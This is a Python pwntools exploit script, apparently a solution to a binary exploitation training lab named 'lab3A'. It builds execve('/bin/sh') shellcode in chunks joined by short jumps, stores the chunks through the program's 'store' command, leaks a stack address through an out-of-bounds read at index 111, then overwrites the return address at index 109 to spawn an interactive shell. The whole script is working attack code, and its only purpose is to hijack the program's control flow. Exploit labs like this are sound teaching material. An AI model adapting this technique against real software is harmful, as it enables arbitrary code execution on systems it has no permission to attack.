from pwn import *
pwnlib.args.SILENT('SILENT')

p = process('./lab3A')

text = """
/* Make space on stack */
add esp, -0x200

/* push '/bin///sh\x00', 0, 0 */
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
mov edx, ecx

/* call execve() */
push SYS_execve /* 0xb */
pop eax
int 0x80
"""
rel_jump_4 = '\xeb\x04'

def send_nums(num1, num2, index):
	p.sendline('store')
	p.sendline(str(num1))
	p.sendline(str(index))

	p.sendline('store')
	p.sendline(str(num2))
	p.sendline(str(index + 1))

# Every instruction is padded to 6 bytes with NOPs and is followed by a short jump to 4 bytes away.
index = 1
for line in text.split('\n'):
	if line.startswith('/*') or not line:
		continue
	code = asm(line)
	shellcode = code + '\x90' * (6 - len(code)) + rel_jump_4

	# Send and store two numbers
	send_nums(u32(shellcode[0:4]), u32(shellcode[4:8]), index)
	index += 3

# Leak value that's 0x250-4 higher than array start.
# Might be different on different machines
p.sendline('read')
p.sendline('111')
p.recvuntil('Number at data[111] is ')
leaked_addr = int(p.recvline().strip())
array_addr = leaked_addr - 0x250 + 4

# Overwrite return address with array address
p.sendline('store')
p.sendline(str(array_addr))
p.sendline(str(109)) # Index 109 is RA in main function

# Quit and run shell
p.sendline('quit')
p.recvuntil('Completed store command successfully\n')
p.interactive()
